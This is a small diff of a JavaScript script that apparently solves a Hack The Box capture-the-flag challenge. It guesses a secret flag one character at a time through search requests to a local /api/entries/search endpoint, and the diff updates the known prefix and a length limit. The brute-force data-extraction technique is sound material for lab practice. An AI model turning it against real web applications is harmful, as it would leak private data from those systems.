@@ -4,7 +4,7 @@
         var target = "127.0.0.1:1337";
         
         var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
-        var flag = "HTB";
+        var flag = "HTB{5";
         var specials = "%\”\’";
         
         var payload = `http://${target}/api/entries/search?q=`
@@ -21,7 +21,7 @@
         }
 
         async function getFlag(chars) {
-            var found = false; var char; var limit = flag.length + 2;
+            var found = false; var char; var limit = flag.length + 5;
             for(var i=0; i < chars.length; i++) {
 
                 char = specials.includes(char) ? '\\' + chars[i]:chars[i];
